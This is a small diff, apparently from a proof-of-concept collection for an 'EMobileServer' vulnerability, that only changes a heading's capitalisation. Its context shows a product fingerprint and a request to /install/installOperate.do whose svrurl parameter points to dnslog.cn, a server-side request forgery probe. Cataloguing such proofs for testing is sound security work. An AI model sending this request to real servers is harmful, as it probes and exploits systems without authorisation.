@@ -8,7 +8,7 @@
 header="EMobileServer"
 ```
 
-## poc
+## POC
 
 ```yaml
 GET /install/installOperate.do?svrurl=http://dnslog.cn HTTP/1.1
